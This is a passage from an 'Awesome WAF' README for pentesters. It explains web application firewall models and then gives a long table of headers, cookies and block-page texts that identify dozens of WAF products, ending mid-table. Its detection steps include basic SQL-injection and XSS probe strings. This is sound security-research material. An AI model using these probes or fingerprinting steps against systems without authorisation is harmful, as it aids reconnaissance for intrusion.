# Awesome WAF ![Awesome](https://camo.githubusercontent.com/13c4e50d88df7178ae1882a203ed57b641674f94/68747470733a2f2f63646e2e7261776769742e636f6d2f73696e647265736f726875732f617765736f6d652f643733303566333864323966656437386661383536353265336136336531353464643865383832392f6d656469612f62616467652e737667 "Awesome")
> A curated list of awesome WAF stuff. 
>
> __Foreword:__ This was originally my own collection on WAFs. I am making it public in the hope that it will be useful for pentesters and researchers out there. "The community just learns from each other." __#SharingisCaring__

![Main Logo](images/how-wafs-work.png 'How wafs work')

__A Concise Definition:__ A web application firewall is a form of firewall with a set of configured rules that controls input, output, and/or access from, to, or by an application or service. It operates by monitoring and potentially blocking the input, output, or system service calls that do not meet the configured policy of the firewall. *(Source [Wikipedia](https://en.wikipedia.org/wiki/Application_firewall))*

Feel free to [contribute](CONTRIBUTING.md).

### Contents:
- [Awesome WAFs List](#awesome-waf-list)
- [Awesome Testing Methodology](#testing-methodology)
- [Awesome WAF Detection](#waf-detection)
- [Awesome Evasion Techniques](#evasion-techniques)
- [Awesome Tools](#awesome-tools)
- [Awesome Blogs & Writeups](#blogs-and-writeups)
- [Awesome Presentations & Papers](#presentations--research-papers)

## How WAFs Work:
- Using a set of rules to distinguish between normal requests and malicious requests.
- Sometimes they use a learning mode to add rules automatically through learning about user behaviour.

## Operation Modes:
- __Negative Model (Blacklist based)__ - A blacklisting model uses pre-set signatures to block web traffic that is clearly malicious, and signatures designed to prevent attacks which exploit certain website and web application vulnerabilities. For example, if a number of IP addresses send a lot more packets than is typical for that many IP addresses being used to surf a website, a blacklisting firewall can effectively prevent DDoS attacks. Blacklisting model web application firewalls are a great choice for websites and web applications on the public internet, because those targets can get a lot of legitimate web traffic from unfamiliar client machines. Eg. Block all `<script>*</script>` inputs.
- __Positive Model (Whitelist based)__ - A whitelisting model only allows web traffic according to specifically configured criteria. For example, it can be configured to only allow HTTP GET requests from certain IP addresses. This model can be very effective for casting a wide metaphorical fishing net for blocking possible cyber-attacks, but just as fishing nets also catch a lot of matter that a fisherman can't sell, whitelisting will block a lot of legitimate traffic. Whitelisting model firewalls are probably best for web applications on an internal network that are designed to be used by only a limited group of people, such as employees.
- __Mixed/Hybrid Model (Inclusive model)__ - A hybrid security model is one that blends both whitelisting and blacklisting. Depending on all sorts of configuration specifics, hybrid firewalls could be the best choice for both web applications on internal networks and web applications on the public internet.

## Testing Methodology:
### Where To Look:
- Always look out for common ports that expose that a WAF `80`, `443`, `8000`, `8008`, `8080`, `8088`.
    > __Tip:__ You can use automate this easily by commandline using a screenshot taker like [WebScreenShot](https://github.com/maaaaz/webscreenshot).
- Some WAFs set their own cookies in requests (eg. Citrix Netscaler, Yunsuo WAF).
- Some associate themselves with separate headers (eg. Anquanbao WAF, Amazon AWS WAF). 
- Some often alter headers and jumble characters to confuse attacker (eg. Citrix Netscaler, F5 Big IP).
- Some (often rare) expose themselves in the `Server` header (eg. Approach, WTS WAF).
- Some WAFs expose themselves in the response content (eg. DotDefender, Armor, Sitelock).
- Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight, 360 WAF).

### Detection Techniques:
1. Make a normal GET request from a browser, intercept and test response headers (specifically cookies).
2. Make a request from command line (eg. cURL), and test response content and headers (no user-agent included).
3. If there is a login page somewhere, try some common (easily detectable) payloads like `' or 1 = 1 --`.
4. If there is some search box or input field somewhere, try detecting payloads like `<script>alert()</script>`.
5. Make GET requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support POST type queries).
6. Many a times, the WAF varies the `Server` header upon different types of interactions.
7. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
    > __Tip:__ This method could be easily achieved with tools like [HPing3](http://www.hping.org) or [Scapy](https://scapy.net).
8. Side Channel Attacks - Examine the timing behaviour of the request and response content. 

## WAF Detection
Wanna detect WAFs? Lets see how.
> __NOTE__: This section contains manual WAF detection techniques. You might want to switch over to [next section](#awesome-tools). 

<table>
    <tr>
        <td>
            360 Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability:</b> Easy </li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Returns status code <code>493</code> upon unusual requests.</li>
                    <li>On viewing source-code of error page, you will find reference to <code>wzws-waf-cgi/</code> directory.</li>
                    <li>Source code may contain reference to <code>wangshan.360.cn</code> URL.</li>
                    <li>Response headers contain <code>X-Powered-By-360WZB</code> Header.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            aeSecure
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains <code>aesecure_denied.png</code> image (view source to see).</li>
                    <li>Response headers contain <code>aeSecure-code</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Airlock (Phion/Ergon)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate/Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Set-Cookie</code> headers may contain <code>AL-SESS={some value}</code> value (case insensitive).</li>
                    <li>Response headers may contain <code>AL-LB={some value}</code> value (case insensitive).</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Anquanbao WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Returns blocked HTTP response code <code>405</code> upon malicious requests.</li>
                    <li>Blocked response content may contain <code>/aqb_cc/error/</code> or <code>hidden_intercept_time</code>.</li>
                    <li>Response headers contain <code>X-Powered-by-Anquanbao</code> header field.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Armor Defense
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains warning<br>
                        <code>This request has been blocked by website protection from Armor.</code>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Application Security Manager (F5 Networks)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains warning<br>
                        <code>The requested URL was rejected. Please consult with your administrator.</code>
                    </li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Approach Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page content may contain:</li>
                        <ul>
                            <li><code>Approach Web Application Firewall</code> text.</li>
                            <li><code>Your IP address has been logged and this information could be used by authorities to track you.</code> warning.</li>
                            <li><code>Sorry for the inconvenience!</code> keyword.</li>
                            <li><code>If this was an legitimate request please contact us with details!</code> text.</li>
                        </ul>
                    <li><code>Server</code> header has field value set to <code>Approach Web Application Firewall</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Amazon AWS WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>AWS</code> value.</li>
                    <li>Blocked response status code return <code>403 Forbidden</code> response.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Yunjiasu WAF (Baidu)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>Yunjiasu-ngnix</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Barracuda WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response cookies may contain <code>barra_counter_session</code> value.</li>
                    <li>Response headers may contain <code>barracuda_</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Bekchy (Faydata)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response headers contains <code>Bekchy - Access Denied</code> text.</li>
                    <li>Blocked response page contains reference to <code>https://bekchy.com/report</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BitNinja Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page may contain:</li>
                    <ul>
                        <li><code>Security check by BitNinja</code> text.</li>
                        <li><code>your IP will be removed from BitNinja</code>.</li>
                        <li><code>Visitor anti-robot validation</code> text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Bluedon IST
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Server</code> header contains <code>BDWAF</code> field value.</li>
                    <li>Blocked response page contains to <code>Bluedon Web Application Firewall</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BIG-IP ASM (F5 Networks)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain <code>BigIP</code> or <code>F5</code> keyword value.</li>
                    <li>Response header fields may contain <code>X-WA-Info</code> header.</li>
                    <li>Response headers might have jumbled <code>X-Cnection</code> field value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BinarySec WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>binarysec</code> keyword value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            BlockDos
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain reference to <code>BlockDos.net</code> URL.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ChinaCache Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>Powered-by-ChinaCache</code> field.</li>
                    <li>Blocked response codes contain <code>400 Bad Request</code> error upon malicious request.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ACE XML Gateway (Cisco)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers have <code>ACE XML Gateway</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cloudbric
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response content has <code>Cloudbric</code> and <code>Malicious Code Detected</code> texts.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cloudflare 
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers might have <code>cf-ray</code> field value.</li>
                    <li><code>Server</code> header field has value <code>cloudflare</code>.</li>
                    <li><code>Set-Cookie</code> response headers have <code>__cfuid=</code> cookie field.</li>
                    <li>Page content might have <code>Attention Required!</code> or <code>Cloudflare Ray ID:</code>.</li>
                    <li>You may encounter <code>CLOUDFLARE_ERROR_500S_BOX</code> upon hitting invalid URLs.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Cloudfront (Amazon)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains <code>Error from cloudfront</code> error upon malicious request.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Comodo Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>Protected by COMODO WAF</code> value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            CrawlProtect (Jean-Denis Brun)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response content contains value<br> <code>This site is protected by CrawlProtect</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            GoDaddy Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains value<br> <code>Access Denied - GoDaddy Website Firewall</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            IBM WebSphere DataPower
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contains field value value <code>X-Backside-Transport</code> with value <code>OK</code> or <code>FAIL</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Deny-All Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response content contains value <code>Condition Intercepted</code>.</li>
                    <li><code>Set-Cookie</code> header contains cookie field <code>sessioncookie</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Distil Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain field value <code>X-Distil-CS</code> in all requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            DoSArrest Internet Security
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain field value <code>X-DIS-Request-ID</code>.</li>
                    <li>Response headers might contain <code>DOSarrest</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            dotDefender
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains value<br> <code>dotDefender Blocked Your Request</code>.</li>
                    <li>Blocked response headers contain <code>X-dotDefender-denied</code> field value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            EdgeCast (Verizon)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains value<br> <code>Please contact the site administrator, and provide the following Reference ID:EdgeCast Web Application Firewall (Verizon)</code>.</li>
                    <li>Blocked response code returns <code>400 Bad Request</code> on malicious requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Expression Engine (EllisLab)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains value <code>Invalid GET Request</code> upon malicious GET queries.</li>
                    <li>Blocked POST type queries contain <code>Invalid POST Request</code> in response content.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            FortiWeb Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response content contains value <code>.fgd_icon</code> keyword.</li>
                    <li>Response headers contain <code>FORTIWAFSID=</code> on malicious requests.</li>
                    <li><code>Set-Cookie</code> header has cookie field <code>cookiesession1=</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            GreyWizard Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page content contains:<br><code>We've detected attempted attack or non standard traffic from your IP address</code> text.</li>
                    <li>Blocked response page title contains <code>Grey Wizard</code> keyword.</li>
                    <li>Response headers contain <code>greywizard</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            HyperGuard Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Set-Cookie</code> header has cookie field <code>ODSESSION=</code> in response headers.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Imperva SecureSphere
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page content may contain:</li>
                        <ul>
                            <li><code>Incapsula incident ID</code> keyword.</li>
                            <li><code>_Incapsula_Resource</code> keyword.</li>
                            <li><code>subject=WAF Block Page</code> keyword.</li>
                        </ul>
                    <li>Normal GET request headers contain <code>visid_incap</code> value.</li>
                    <li>Response headers may contain <code>X-Iinfo</code> header field name.</li>
                    <li><code>Set-Cookie</code> header has cookie field <code>incap_ses</code> in response headers.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Immunify360 (CloudLinux Inc.)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Headers contain <code>imunify360</code> keyword.</li>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>Powered by Imunify360</code> text.</li>
                        <li><code>imunify360 preloader</code> if response type is JSON.</li>
                    </ul>
                    <li>Blocked response page contains <code>protected by Imunify360</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ISAServer
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>The ISA Server denied the specified Uniform Resource Locator (URL)</code> text.</li>
                        <li><code>The server denied the specified Uniform Resource Locator (URL). Contact the server administrator.</code> text</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Janusec Application Gateway
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page displays <code>Janusec Application Gateway</code> on malicious requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Jiasule Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains reference to <code>static.jiasule.com/static/js/http_error.js</code> URL.</li>
                    <li><code>Set-Cookie</code> header has cookie field <code>__jsluid=</code> in response headers.</li>
                    <li>Response headers have <code>jiasule-WAF</code> or <code>jsl_tracking</code> keywords.</li>
                    <li>Blocked response content has <code>notice-jiasule</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            KnownSec Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page displays <code>ks-waf-error.png</code> image (view source to see).</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            KONA Site Defender (Akamai)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Headers contain <code>AkamaiGHost</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Malcare (Inactiv)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page may contains:</li>
                        <ul>
                            <li><code>Blocked because of Malicious Activities</code> text.</li>
                            <li><code>Firewall powered by MalCare</code> text.</li>
                        </ul>
               </ul>
            </ul>
        </td>
    </tr>    
    <tr>
        <td>
            ModSecurity (Trustwave)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate/Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains:</li>
                        <ul>
                            <li><code>This error was generated by Mod_Security</code> text.</li>
                            <li><code>One or more things in your request were suspicious</code> text.</li>
                            <li><code>rules of the mod_security module</code> text.</li>
                        </ul>
                    <li>Response headers may contain <code>Mod_Security</code> or <code>NYOB</code> keywords.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NAXSI (NBS Systems)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain unusual field <code>X-Data-Origin</code> with value <code>naxsi/waf</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Netcontinuum (Barracuda)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Session cookies contain <code>NCI__SessionId=</code> cookie field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NinjaFirewall (NinTechNet)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page title contains <code>NinjaFirewall: 403 Forbidden</code>.</li>
                    <li>Response page contains:
                        <ul>
                            <li><code>For security reasons, it was blocked and logged</code> text.</li>
                            <li><code>NinjaFirewall</code> keyword.</li>
                        </ul>
                    </li>
                    <li>Returns a <code>403 Forbidden</code> response upon malicious requests.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NetScaler (Citrix)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain</li>
                    <ul>
                        <li><code>Connection:</code> header field name jumbled to <code>nnCoection:</code></li>
                        <li><code>ns_af=</code> cookie field name.</li>
                        <li><code>citrix_ns_id</code> field name.</li>
                        <li><code>NSC_</code> keyword.</li>
                        <li><code>NS-CACHE</code> field value.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NewDefend Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>newdefend</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            NSFocus Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>NSFocus</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            onMessage Shield (Blackbaud)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain unusual header <code>X-Engine</code> field with value <code>onMessage Shield</code>.</li>
                    <li>Response page may contain <code>onMessage SHIELD</code> keyword.</li>
                    <li>You might encounter response page with<br><code>This site is protected by an enhanced security system to ensure a safe browsing experience</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Palo Alto Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains the following text<br> <code>has been blocked in accordance with company policy</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            PerimeterX Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains reference to<br> <code>https://www.perimeterx.com/whywasiblocked</code> URL.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Profense Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate/Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li><code>Set-Cookie</code> headers contain <code>PLBSID=</code> cookie field name.</li>
                    <li>Response headers may contain <code>Profense</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Radware Appwall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains the following text:<br> <code>Unauthorized Activity Has Been Detected.</code> and <code>Case Number</code> text.</li>
                    <li>Response headers may contain <code>X-SL-CompState</code> header field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Reblaze Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>rbzid=</code> header field name.</li>
                    <li>Response headers field values might contain <code>Reblaze Secure Web Gateway</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Request Validation Mode (ASP.NET)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>A firewall found specifically on ASP.NET websites and none others.</li>
                    <li>Response page contains either of the following text:</li>
                    <ul>
                        <li><code>ASP.NET has detected data in the request that is potentially dangerous.</code></li>
                        <li><code>Request Validation has detected a potentially dangerous client input value.</code></li>
                        <li><code>HttpRequestValidationException.</code></li>
                    </ul>
                    <li>Blocked response code returned is always <code>500 Internal Error</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            RSFirewall (RSJoomla)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>COM_RSFIREWALL_403_FORBIDDEN</code> keyword.</li>
                        <li><code>COM_RSFIREWALL_EVENT</code> keyword.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Safe3 Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>Safe3</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SafeDog Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy/Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain:</li>
                    <ul>
                        <li><code>WAF/2.0</code> keyword.</li>
                        <li><code>safedog</code> field value.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SecureIIS (BeyondTrust)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains either of the following text:</li>
                    <ul>
                        <li><code>SecureIIS Web Server Protection.</code></li>
                        <li>Reference to <code>http://www.eeye.com/SecureIIS/</code> URL.</li>
                        <li><code>subject={somevalue} SecureIIS Error</code> text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SEnginx (Neusoft)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>SENGINX-ROBOT-MITIGATION</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ShieldSecurity
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains<br> <code>Something in the URL, Form or Cookie data wasn't appropriate</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SiteGround Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains<br> <code>The page you are trying to access is restricted due to a security rule</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SiteGuard (JP Secure)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:
                    <ul>
                        <li><code>Powered by SiteGuard</code> text.</li>
                        <li><code>The server refuse to browse the page.</code> text</li>
                    </ul> 
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SiteLock TrueShield
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page source contains the following:</li>
                    <ul>
                        <li><code>SiteLock Incident ID</code> text.</li>
                        <li><code>sitelock-site-verification</code> keyword.</li>
                        <li><code>sitelock_shield_logo</code> image.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SonicWall (Dell)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>SonicWALL</code> keyword value.</li>
                    <li>Blocked response page contains either of the following text:</li>
                    <ul>
                        <li><code>This request is blocked by the SonicWALL.</code></li>
                        <li><code>#shd</code> or <code>#nsa_banner</code> hashtags.</li>
                        <li><code>Web Site Blocked</code> text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Sophos UTM Firewall 
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains <code>Powered by UTM Web Protection</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            SquareSpace Firewall
        </td>
